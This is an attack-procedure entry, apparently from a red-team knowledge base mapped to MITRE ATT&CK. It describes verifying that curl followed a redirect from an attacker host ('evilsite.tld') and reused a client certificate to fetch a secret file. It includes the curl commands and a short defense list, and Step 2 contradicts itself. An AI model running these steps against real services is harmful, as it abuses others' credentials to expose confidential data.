---
id: proc-uuid-005
name: Observe-Unauthorized-Access
tags:
  - observe
  - access
  - verification
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Lateral Movement]]'
commands: []
verified: false
platforms:
  - Linux
  - Windows
  - macOS
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Valid Accounts]]'
updated_at: '2025-12-14T17:30:58.723Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Lateral Movement]]'
mitre_techniques:
  - '[[Valid Accounts]]'
---
# Observe-Unauthorized-Access

## Summary

This procedure verifies that the redirect was followed, the certificate was reused, and protected content was fetched without direct target access.

## Description

After executing curl, observe the output to confirm unauthorized access. The impact is exposure of confidential info if apps follow untrusted redirects with auth. No private key leak required, just possession.

## Requirements

1. Successful curl execution from prior step
2. Knowledge of expected secret content

## Defense

Defensive measures and detection strategies:

- Implement client-side redirect validation
- Log TLS cert presentations by host
- Use session-bound auth instead of persistent certs

## Objectives

1. Confirm cert reuse
2. Retrieve and view secret data
3. Assess impact of vulnerability

## Instructions

### Step 1: Inspect Curl Output

**Context**: Review the response for target content.

```bash
curl -L --cert client.crt --key client.key https://evilsite.tld/something > output.txt
cat output.txt
```

> Displays secretfile content. Expected output: "This is secret content" or similar.

### Step 2: Validate No Direct Access

**Context**: Ensure access was via redirect, not direct.

Test direct curl to target without redirect:

```bash
curl --cert client.crt --key client.key https://targetsite.tld/secretfile
```

> Should succeed similarly, but the point is indirect via evil site.

## MITRE ATT&CK Mapping

### Tactics

- [[Lateral Movement]] Lateral Movement

### Techniques

- [[Valid Accounts]] Valid Accounts

### Sub-Techniques


## Commands Used


## Tools Used

- [[tools/curl]]

## Tags

- observe
- access
- verification
